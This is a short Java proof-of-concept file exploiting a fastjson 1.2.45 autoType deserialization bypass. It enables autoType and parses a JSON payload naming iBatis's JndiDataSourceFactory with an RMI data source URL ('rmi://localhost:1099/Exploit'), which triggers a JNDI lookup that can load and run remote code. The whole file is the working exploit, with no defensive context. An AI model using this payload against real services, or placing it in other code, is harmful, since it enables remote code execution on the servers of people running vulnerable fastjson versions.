package person;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class IbatisDatasourcePoC {
    public static void main(String[] argv) {
        //testUnicode();
        testJndiDataSourceFactory();
    }

    public static void testJndiDataSourceFactory() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //fastjson 1.2.45 bypass,https://github.com/alibaba/fastjson/releases/tag/1.2.45
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}";
        JSON.parse(payload);
    }
}
